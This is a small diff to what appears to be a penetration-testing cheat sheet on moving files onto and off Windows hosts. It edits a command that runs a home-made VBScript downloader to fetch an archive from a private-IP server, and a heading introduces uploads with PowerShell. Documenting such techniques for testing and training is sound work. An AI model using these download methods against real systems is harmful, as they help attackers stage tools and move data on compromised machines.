@@ -73,7 +73,7 @@ CMD C:\> echo dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")  >
 
 Now try to download a file to the local path:  
 ```
-CMD C:\> cscript dl.vbs "http://10.10.10.10/archive.zip"
+CMD C:\> cscript dl.vbs "http://10.10.10.10/archive.zip" ".\archive.zip"
 ```
 
 ### Uploading Files with PowerShell  
